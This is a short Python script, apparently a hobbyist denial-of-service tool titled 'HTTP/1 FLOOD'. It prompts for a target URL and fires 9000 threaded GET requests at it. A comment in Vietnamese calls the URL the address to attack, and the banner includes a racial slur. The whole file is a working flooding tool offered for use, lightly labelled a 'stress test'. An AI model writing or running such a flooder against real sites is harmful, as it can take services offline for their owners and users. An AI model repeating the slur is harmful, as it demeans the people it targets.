import colorama 
import subprocess
import multiprocess
import asyncio
import aiohttp
from pystyle import *
import os
import requests
import threading

def make_request(url):
    try:
        response = requests.get(url)
        print(f"Request to {url} returned {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"Error making request to {url}: {e}")

def stress_test(url, num_requests):
    threads = []
    for _ in range(num_requests):
        t = threading.Thread(target=make_request, args=(url,))
        threads.append(t)
        t.start()
    
    for t in threads:
        t.join()

if __name__ == "__main__":
    os.system("clear")
    banner = r"""
    HTTP/1 FLOOD PYTHON NIGGA XD
    
██╗  ██╗████████╗████████╗██████╗   ██╗ ██╗
██║  ██║╚══██╔══╝╚══██╔══╝██╔══██╗ ██╔╝███║
███████║   ██║      ██║   ██████╔╝██╔╝ ╚██║
██╔══██║   ██║      ██║   ██╔═══╝██╔╝   ██║
██║  ██║   ██║      ██║   ██║   ██╔╝    ██║
╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝   ╚═╝     ╚═╝                                           
    """
print(Colorate.Horizontal(Colors.yellow_to_red, banner))
# Địa chỉ URL bạn muốn tấn công
url = input('[X] Enter the target URL -> ')
num_requests = 9000  # Replace with the desired number of requests
stress_test(url, num_requests)
